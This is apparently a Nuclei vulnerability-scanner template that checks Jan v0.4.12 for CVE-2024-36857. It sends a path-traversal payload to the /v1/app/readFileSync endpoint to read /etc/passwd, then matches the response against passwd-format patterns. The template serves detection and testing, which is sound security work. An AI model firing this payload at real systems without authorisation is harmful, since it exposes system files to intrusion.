id: CVE-2024-36857-Jan-path-traversal-vulnerability
info:
  name: CVE-2024-36857 Jan path traversal vulnerability
  author: Yusuf Amr
  severity: high
  description: |
    Jan v0.4.12 was discovered to contain an arbitrary file read vulnerability via the /v1/app/readFileSync interface.
  tags:
    - cve
    - cve2024
    - jan
    - path-traversal
    - arbitrary-file-read
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-36857
    - https://www.miggo.io/vulnerability-database/cve/CVE-2024-36857
    - https://access.redhat.com/security/cve/cve-2024-36857
    - https://www.wiz.io/vulnerability-database/cve/cve-2024-36857
    - https://github.com/HackAllSec/CVEs/tree/main/Jan%20AFR%20vulnerability
    - https://jan.ai/

requests:
  - method: POST
    path:
      - "{{BaseURL}}/v1/app/readFileSync"
    headers:
      Content-Type: text/plain;charset=UTF-8
      User-Agent: Nuclei-Scanner
      Connection: close
    body: '["file:/../../../../../../etc/passwd","utf-8"]'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: regex
        part: body
        regex:
          - '(?m)^root:.*:0:0'
          - '(?m)^[^:]+:[^:]*:[0-9]{1,5}:[0-9]{1,5}:'
